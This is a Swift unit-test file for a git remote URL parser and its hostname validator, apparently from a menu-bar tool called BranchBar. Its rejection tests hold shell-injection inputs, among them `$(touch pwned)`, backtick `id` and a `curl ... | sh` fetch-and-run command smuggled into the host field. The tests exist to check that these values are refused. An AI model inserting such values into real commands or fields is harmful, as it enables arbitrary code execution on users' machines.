import Foundation
import Testing

@testable import BranchBarCore

// Packet 1.1 owns `GitHubSlug.init?(remoteURL:)`. It is pure parsing over the string
// `git config --get remote.origin.url` prints, so it is unit-tested here with no seams.
// PLAN.md §5: "`GitHubSlug { host, owner, name; init?(remoteURL:) }` any host."

@Suite("GitHubSlug parses every remote URL shape git writes")
struct GitHubSlugTests {

    @Test("HTTPS remote with .git suffix")
    func httpsWithGitSuffix() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://github.com/hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("HTTPS remote without .git suffix")
    func httpsWithoutGitSuffix() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://github.com/hannahstulberg/branchbar"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("HTTPS remote with a trailing slash")
    func httpsWithTrailingSlash() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://github.com/hannahstulberg/branchbar/"))
        #expect(slug.name == "branchbar")
    }

    @Test("HTTPS remote with a trailing slash after .git")
    func httpsWithTrailingSlashAfterGit() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://github.com/hannahstulberg/branchbar.git/"))
        #expect(slug.name == "branchbar")
    }

    @Test("scp-like remote git@host:owner/name.git")
    func scpLikeRemote() throws {
        let slug = try #require(GitHubSlug(remoteURL: "git@github.com:hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("scp-like remote with no user part")
    func scpLikeRemoteWithoutUser() throws {
        let slug = try #require(GitHubSlug(remoteURL: "github.com:hannahstulberg/branchbar"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("ssh:// remote")
    func sshSchemeRemote() throws {
        let slug = try #require(GitHubSlug(remoteURL: "ssh://git@github.com/hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("ssh:// remote with an explicit port drops the port from the host")
    func sshSchemeRemoteWithPort() throws {
        let slug = try #require(GitHubSlug(remoteURL: "ssh://git@github.com:22/hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("git:// remote")
    func gitSchemeRemote() throws {
        let slug = try #require(GitHubSlug(remoteURL: "git://github.com/hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.name == "branchbar")
    }

    // PLAN.md §2: "NYT git host: github.com most likely; GHE not ruled out"; §5 says any host.
    @Test("GitHub Enterprise host is preserved, not rewritten to github.com")
    func enterpriseHostIsPreserved() throws {
        let https = try #require(GitHubSlug(remoteURL: "https://github.nytimes.com/newsroom/tooling.git"))
        #expect(https.host == "github.nytimes.com")
        #expect(https.owner == "newsroom")
        #expect(https.name == "tooling")

        let ssh = try #require(GitHubSlug(remoteURL: "git@github.nytimes.com:newsroom/tooling.git"))
        #expect(ssh.host == "github.nytimes.com")
        #expect(ssh.owner == "newsroom")
        #expect(ssh.name == "tooling")
    }

    @Test("Credentials embedded in the URL never leak into the host")
    func userInfoIsStripped() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://hannahstulberg:ghp_notarealtoken@github.com/hannahstulberg/branchbar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "hannahstulberg")
        #expect(slug.name == "branchbar")
    }

    @Test("Host case is normalized to lower case; owner and name keep their case")
    func hostIsLowercasedOwnerAndNameAreNot() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://GitHub.COM/HannahStulberg/BranchBar.git"))
        #expect(slug.host == "github.com")
        #expect(slug.owner == "HannahStulberg")
        #expect(slug.name == "BranchBar")
    }

    @Test("A deeper path uses the last two components as owner and name")
    func deeperPathUsesLastTwoComponents() throws {
        let slug = try #require(GitHubSlug(remoteURL: "ssh://git@github.nytimes.com/v3/newsroom/tooling.git"))
        #expect(slug.host == "github.nytimes.com")
        #expect(slug.owner == "newsroom")
        #expect(slug.name == "tooling")
    }

    @Test("Surrounding whitespace from a config read is tolerated")
    func trailingNewlineIsTolerated() throws {
        let slug = try #require(GitHubSlug(remoteURL: "  https://github.com/hannahstulberg/branchbar.git\n"))
        #expect(slug.name == "branchbar")
    }

    @Test("The slug renders as host/owner/name for gh --repo")
    func ghRepoArgumentShape() throws {
        let slug = try #require(GitHubSlug(remoteURL: "https://github.com/hannahstulberg/branchbar.git"))
        #expect(slug.ghRepoArgument == "github.com/hannahstulberg/branchbar")
    }

    @Test("Remotes that are not a host plus owner plus name return nil", arguments: [
        "",
        "   ",
        "not a url at all",
        "https://github.com/hannahstulberg",
        "https://github.com/",
        "https://github.com",
        "/Users/hannahstulberg/some/local/repo.git",
        "file:///Users/hannahstulberg/some/local/repo.git",
        "../relative/repo.git",
        "git@github.com:",
        "git@github.com:onlyowner",
    ])
    func rejectsNonSlugRemotes(_ remote: String) {
        #expect(GitHubSlug(remoteURL: remote) == nil, "\(remote) should not parse as a slug")
    }
}

// codex BLOCKER 1 / REVIEW CR-01. `host` reaches `Actions.writeSignInScript`, which writes zsh
// source, so a host is not merely displayed text: it is the one repo-controlled value that used to
// reach a shell. `isValidHostname` is the grammar every decode boundary applies, and
// `init?(remoteURL:)` returns nil rather than carrying a host that fails it.
@Suite("GitHubSlug refuses a host that is not a hostname")
struct GitHubSlugHostnameTests {

    @Test("hostWithShellMetacharactersIsRejected", arguments: [
        "https://$(touch pwned)/owner/repo.git",
        "ssh://git@$(touch pwned)/owner/repo.git",
        "https://github.com;curl https://x/p|sh/o/n",
        "https://github.com;id/o/n",
        "https://a$(id).com/o/n",
        "https://a b.com/o/n",
        "https://git\"hub.com/o/n",
        "https://git'hub.com/o/n",
        "https://git`id`hub.com/o/n",
        "https://git\nhub.com/o/n",
        "https://github.com&/o/n",
        "https://-github.com/o/n",
        "https://github-.com/o/n",
        "https://github..com/o/n",
        "https://github.com./o/n",
        "git@github.com;id:owner/repo.git",
    ])
    func hostWithShellMetacharactersIsRejected(_ remote: String) {
        #expect(GitHubSlug(remoteURL: remote) == nil, "\(remote) parsed to a slug; its host is not a hostname")
    }

    @Test("The hostname grammar accepts what git remotes really carry", arguments: [
        "github.com",
        "github.nytimes.com",
        "localhost",
        "my-host-1.example.co.uk",
        "a",
        "1.2.3.4",
    ])
    func acceptsRealHostnames(_ host: String) {
        #expect(GitHubSlug.isValidHostname(host), "\(host) is a hostname and was rejected")
    }

    @Test("The hostname grammar refuses everything a shell would read as syntax", arguments: [
        "",
        " ",
        "github.com;id",
        "$(touch pwned)",
        "`id`",
        "a b.com",
        "a\tb.com",
        "a\nb.com",
        "host|pipe.com",
        "host&.com",
        "host'quote.com",
        "host\"quote.com",
        "host\\escape.com",
        "-leading.com",
        "trailing-.com",
        "double..dot.com",
        "trailing.dot.com.",
        ".leading.dot.com",
        "host_underscore.com",
        "host:1234",
        "host/path",
    ])
    func refusesNonHostnames(_ host: String) {
        #expect(!GitHubSlug.isValidHostname(host), "\(host) is not a hostname and was accepted")
    }

    @Test("A label over 63 characters, or a name over 253, is refused")
    func lengthLimits() {
        let label63 = String(repeating: "a", count: 63)
        let label64 = String(repeating: "a", count: 64)
        #expect(GitHubSlug.isValidHostname("\(label63).com"))
        #expect(!GitHubSlug.isValidHostname("\(label64).com"))

        // 4 × 63 + 3 dots = 255 characters, over the 253 limit, with every label legal.
        let tooLong = Array(repeating: label63, count: 4).joined(separator: ".")
        #expect(tooLong.count == 255)
        #expect(!GitHubSlug.isValidHostname(tooLong))
    }
}

// codex MINOR 3. The validated host has to reach the shell, because `Actions.openPR` refuses a PR
// link whose host is not the repo's own. `RepoSectionVM.host` is that carrier, and it is filled
// from the slug rather than re-parsed from the link — a tampered cache can rewrite the link, and
// the point of the check is that the link is not what decides where it may point.
@Suite("The validated host reaches the view model the shell opens PRs from")
struct RepoSectionHostTests {

    @Test("A repo with a GitHub remote carries its host onto the section")
    func sectionCarriesTheSlugHost() throws {
        let repo = Repo(
            id: RepoID(commonDir: "/repos/branchbar/.git"),
            name: "branchbar",
            path: "/repos/branchbar",
            remoteURL: "https://github.nytimes.com/newsroom/tooling.git",
            githubSlug: GitHubSlug(remoteURL: "https://github.nytimes.com/newsroom/tooling.git"))

        let vm = SnapshotPresenter().present(
            Snapshot(repos: [repo]),
            refreshState: .idle(lastRefreshedAt: nil),
            collapsedRepoIDs: [],
            scanResult: nil,
            appVersion: "0.9.0",
            now: Date(timeIntervalSince1970: 1_788_400_000))

        #expect(vm.sections.first?.host == "github.nytimes.com")
    }

    @Test("A repo with no GitHub remote carries no host, so no PR link can be opened for it")
    func sectionWithoutASlugCarriesNoHost() throws {
        let repo = Repo(
            id: RepoID(commonDir: "/repos/notes/.git"),
            name: "notes",
            path: "/repos/notes")

        let vm = SnapshotPresenter().present(
            Snapshot(repos: [repo]),
            refreshState: .idle(lastRefreshedAt: nil),
            collapsedRepoIDs: [],
            scanResult: nil,
            appVersion: "0.9.0",
            now: Date(timeIntervalSince1970: 1_788_400_000))

        #expect(vm.sections.first?.host == nil)
    }
}
